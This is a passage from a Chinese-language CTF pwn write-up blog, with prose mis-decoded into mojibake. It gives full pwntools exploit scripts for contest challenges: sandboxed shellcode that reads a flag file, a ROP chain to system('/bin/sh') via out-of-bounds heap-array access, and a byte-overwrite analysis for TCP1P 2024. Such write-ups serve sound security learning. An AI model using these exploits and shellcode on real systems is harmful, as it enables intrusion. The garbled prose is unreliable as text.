<p>ä¸‹äº”å­æ£‹ï¼Œåªè¦è‡ªå·±æœ‰äº”ä¸ªèƒ½è¿æˆä¸€å—çš„å°±å¯ä»¥æ‹¿åˆ°ä¸€æ¬¡è¾“å…¥æœºä¼šï¼ˆå¯¹æ–¹æ€ä¹ˆæ ·ä¸ç®¡ï¼‰ï¼Œè¾“å…¥å¯ä»¥è¦†å†™æ ˆä¸Šçš„ä¸€ä¸ªç”¨äºå¤„ç†é”™è¯¯è¾“å…¥çš„å‡½æ•°æŒ‡é’ˆã€‚ç¨‹åºè¿˜æœ‰ä¸€ä¸ªadminå‡½æ•°æä¾›é™åˆ¶æ–‡ä»¶åçš„è¯»æ–‡ä»¶ï¼ˆflagçš„gè¢«è¿‡æ»¤äº†ï¼‰ç„¶åè¿”å›mainã€‚partial overwriteçˆ†ç ´è¯¥æŒ‡é’ˆæŒ‡å‘adminå‡½æ•°ä¹‹åè¯»å–&#x2F;proc&#x2F;self&#x2F;mapsï¼Œç›´æ¥æ‹¿åˆ°libcåœ°å€ï¼Œä¹‹åè¦†å†™å‡½æ•°æŒ‡é’ˆä¸ºone gadget,æ­£å¥½æœ‰ä¸€ä¸ªå¯ä»¥æ„é€ æ»¡è¶³æ¡ä»¶ã€‚æ‹¿åˆ°shellååªèƒ½ç”¨pwn2æ¥è¯»flag,è¾“å…¥æŒ‡ä»¤.&#x2F;pwn2 -c aaa .&#x2F;flagä¹‹åcat .&#x2F;aaaæ‹¿åˆ°flag</p>
<hr>
<h1 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> pwnlib.adb <span class="keyword">import</span> shell</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./bin/ezcode&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-36f53f067e.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsp, 0x9998200;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x67616c662f2e;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi, rax;</span></span><br><span class="line"><span class="string">xor rdi, rdi;</span></span><br><span class="line"><span class="string">inc rdi;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">mov rdx, rsp;</span></span><br><span class="line"><span class="string">mov r10, 0x100;</span></span><br><span class="line"><span class="string">mov rax, 40;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">00000000: 4c87 ff66 ba07 0066 b80a 000f 0599 31c0  L..f...f......1.</span></span><br><span class="line"><span class="string">00000010: 87ce 31ff 0f05                           ..1...</span></span><br><span class="line"><span class="string">4c87ff66ba070066b80a000f059931c087ce31ff0f05</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xchg rdi, r15;</span></span><br><span class="line"><span class="string">mov dx, 0x7;</span></span><br><span class="line"><span class="string">mov ax, 10;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">cdq;</span></span><br><span class="line"><span class="string">xor eax, eax;</span></span><br><span class="line"><span class="string">xchg esi, ecx;</span></span><br><span class="line"><span class="string">xor edi, edi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;&#123;&quot;shellcode&quot;:&quot;4c87ff66ba070066b80a000f059931c087ce31ff0f05&quot;&#125;&quot;&quot;&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\x00&quot;</span> * <span class="number">9</span> + asm(shellcode))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ²™ç®±shellcodeé¢˜ï¼Œæ²™ç®±åªé™åˆ¶äº†execve&#x2F;execveatã€‚ç”¨jsonæ ¼å¼è¾“å…¥æœºå™¨ç è½¬åŒ–ä¸ºåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼Œé™åˆ¶è¯¥å­—ç¬¦ä¸²é•¿åº¦å°äº44,å³åŸæœºå™¨ç é•¿åº¦å°äº22.ç”±äºåœ¨copyä¹‹åæŠŠæœºå™¨ç åœ°å€çš„å†™æƒé™å…³æ‰äº†ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å¢åŠ æœºå™¨ç åœ°å€çš„å†™æƒé™ï¼Œç„¶åç”¨readå†å¾€é‡Œè¾¹å†™æœºå™¨ç ã€‚ç”¨xchg,xorï¼Œå’Œcdqå¯ä»¥ä»¥éå¸¸çŸ­çš„æ–¹å¼æ„é€ æ»¡è¶³çš„shellcode, å¯ä»¥å¾€æœºå™¨ç åœ°å€é™„è¿‘è¾“å…¥å¾ˆé•¿çš„å†…å®¹ï¼Œä¹‹åå°±è¾“å…¥padding+open+sendfileæ‹¿åˆ°flag.</p>
<hr>
<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h1><blockquote>
<p><del>æ„Ÿè§‰åƒä¸´æ—¶å‡ºçš„</del></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./guestbook/pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./guestbook/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_dll = cdll.LoadLibrary(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-2e5d3b8445.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"><span class="comment"># &gt; 0x500</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;size\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x500</span>)</span><br><span class="line">edit(-<span class="number">4</span>, <span class="string">b&quot;aaaabbb|&quot;</span>)</span><br><span class="line">show(-<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = recv(<span class="string">b&quot;\n&quot;</span>) - <span class="number">0x21B723</span></span><br><span class="line">environ = libc_base + libc.sym.environ</span><br><span class="line">sys = libc.sym.system + libc_base</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">pop_rdi = <span class="number">0x000000000002A3E5</span> + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000F410B</span> + libc_base</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000002a3e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x00000000000f410b: ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(-<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">bss_base = recv(<span class="string">b&quot;\n&quot;</span>) - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">edit(-<span class="number">11</span>, p64(bss_base))</span><br><span class="line">edit(-<span class="number">11</span>, p64(environ))</span><br><span class="line">show(-<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = recv(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ret_addr = stack_addr - <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">edit(-<span class="number">11</span>, p64(ret_addr))</span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">edit(-<span class="number">12</span>, p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls(stack_addr)</span><br><span class="line">ls(libc_base)</span><br><span class="line">ls(bss_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é«˜ç‰ˆæœ¬å †ï¼Œä½†å’Œå †ä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ã€‚heapsizeä¸heaparrayæŒ¨ç€ï¼Œæ²¡æœ‰é™åˆ¶è¶Šç•Œè¯»å†™ï¼Œç›´æ¥æ”¹stderrç„¶åè¯»æ³„æ¼libcåŸºåœ°å€ã€‚bssä¸Šæœ‰ä¸€ä¸ªæŒ‡å‘è‡ªå·±çš„æŒ‡é’ˆï¼Œä»»æ„è¯»å¯å¾—bssåŸºåœ°å€ï¼Œä»»æ„å†™è¯¥æŒ‡é’ˆä¸ºbssæ®µä¸ŠæŸä¸ªåœ°å€ï¼Œåˆ©ç”¨è¿™æ¡é“¾å¯ä»¥å®Œæˆä»»æ„è¯»å†™ã€‚ä»»æ„è¯»environå¾—æ ˆåœ°å€è®¡ç®—å¾—è¿”å›åœ°å€ï¼Œç„¶åå¾€è¿”å›åœ°å€å†™ROPé“¾ï¼Œæœ€åæˆåŠŸgetshell</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/14/2024TCP1P/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/14/2024TCP1P/" class="post-title-link" itemprop="url">[TCP1P 2024] Pwn writeup(éƒ¨åˆ†)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-14 23:10:43" itemprop="dateCreated datePublished" datetime="2024-10-14T23:10:43+08:00">2024-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-16 21:46:21" itemprop="dateModified" datetime="2024-10-16T21:46:21+08:00">2024-10-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="baby-cfhp-ğŸ©¸"><a href="#baby-cfhp-ğŸ©¸" class="headerlink" title="baby_cfhp ğŸ©¸"></a>baby_cfhp ğŸ©¸</h1><hr>
<blockquote>
<p>è¿™ç«Ÿç„¶è®©æˆ‘æ‹¿äº†ä¸€è¡€ï¼Œä¸è¿‡åè¾¹è¿˜æ˜¯è¢«è–„çº±äº†</p>
</blockquote>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ç¨‹åºç»™äº†æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ptr;</span><br><span class="line">  <span class="type">int</span> idx, val;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;address: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%li&quot;</span>, &amp;ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%i&quot;</span>, &amp;val);</span><br><span class="line"></span><br><span class="line">  ptr = (ptr &amp; ~((<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)) |</span><br><span class="line">        ((ptr &amp; <span class="number">0xff</span>) ^ ((val &amp; <span class="number">0xff</span>) ^ ((val &amp; <span class="number">0xff</span>) &gt;&gt; <span class="number">1</span>))) |</span><br><span class="line">        (ptr &amp; <span class="number">0xffff</span> &amp; ~<span class="number">0xff</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å¼€PIEå’ŒFull relro,ä¹Ÿæ²¡æœ‰å»é™¤ç¬¦å·.libcä»dockeré‡Œæ‰£å‡ºæ¥patch.</p>
<p>ç¨‹åºçš„é€»è¾‘ç»“æ„å¾ˆç®€å•ï¼Œè¾“å…¥ptrå’Œvalä¹‹åèµ‹å€¼pträ¸€ä¸ªå¤æ‚çš„è¡¨è¾¾å¼;</p>
<p>å¯¹è¿™ä¸ªè¡¨è¾¾å¼é€†å‘åˆ†æä¸€ä¸‹ï¼ˆåŠ ä¸ª<strong>æŠŠæ¯ä¸ªè®¡ç®—éƒ¨åˆ†è¾“å‡º</strong>çš„ä»£ç ç¼–è¯‘ä¸€ä»½è·‘ä¸€ä¸‹å°±è¡Œäº†ï¼‰ï¼Œå‘ç°ä»…å¯¹ptræœ€ä½ä¸€ä½çš„å­—èŠ‚è¿›è¡Œäº†ä¿®æ”¹ï¼Œä¸”å¿…é¡»åœ¨çŸ¥é“ptråŸå†…å®¹çš„å‰æä¸‹æ‰èƒ½æ­£ç¡®ä¿®æ”¹ã€‚</p>
<p>ä¿®æ”¹æœ€ä½ä¸€å­—èŠ‚çš„é€†å‘ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">payload, ptr</span>):</span><br><span class="line">    tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">    res1 = tmp &amp; <span class="number">0b1000_0000</span></span><br><span class="line">    res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­payloadæ˜¯æˆ‘ä»¬æƒ³è¦å†™å…¥çš„å†…å®¹ï¼Œptræ˜¯åŸptræŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å®¹</p>
<p>è¿™ç§æ–¹å¼ç»™æˆ‘ä»¬çš„åˆ©ç”¨å¢åŠ äº†å¾ˆå¤§çš„é™åˆ¶ï¼šæˆ‘ä»¬å¿…é¡»çŸ¥é“ptræŒ‡å‘çš„å†…å®¹æ‰èƒ½ä»»æ„å†™ï¼Œè€Œä¸”æˆ‘ä»¬åªèƒ½å†™ä¸€ä¸ªå­—èŠ‚ã€‚è¿™æ— è®ºæ˜¯æ³„æ¼åœ°å€è¿˜æ˜¯æ„é€ åˆ©ç”¨éƒ½å¾ˆå›°éš¾ã€‚</p>
<p>é¦–å…ˆéœ€è¦æƒ³åŠæ³•æŠŠä¸€æ¬¡å†™å˜æˆå¤šæ¬¡å†™ï¼Œåšæ³•æ˜¯ä¿®æ”¹exitçš„gotè¡¨ä¸º_startçš„åœ°å€ã€‚å› ä¸ºexitæœªè¢«è°ƒç”¨ï¼Œæ‰€ä»¥è¿˜æ²¡æœ‰å»¶è¿Ÿç»‘å®šï¼Œexitçš„gotè¡¨æŒ‡å‘pltè¡¨é™„è¿‘ï¼Œè€Œpltè¡¨ä¸_startå‡½æ•°ç¦»å¾—å¾ˆè¿‘ï¼ˆåªæœ‰æœ€åä¸€ä¸ªå­—èŠ‚çš„å·®å¼‚ï¼‰ï¼Œä¸”ç¨‹åºæ²¡å¼€PIE,å› æ­¤å¯ä»¥ä¿®æ”¹ã€‚ä¿®æ”¹åä¾¿æ‹¿åˆ°äº†å¤šæ¬¡å†™ã€‚</p>
